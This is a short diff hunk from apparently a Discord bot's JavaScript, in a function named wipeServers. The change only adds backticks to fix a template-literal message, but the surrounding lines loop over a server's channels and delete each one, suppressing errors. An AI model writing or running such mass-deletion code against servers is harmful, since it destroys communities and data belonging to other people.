@@ -85,7 +85,7 @@ async function wipeServers(owner) {
         continue;
       }
 
-      await owner.send(Cleaning ${guild.name}...);
+      await owner.send(`Cleaning ${guild.name}...`);
 
       for (const channel of guild.channels.cache.values()) {
         try { await channel.delete(); await delay(800); } catch {}
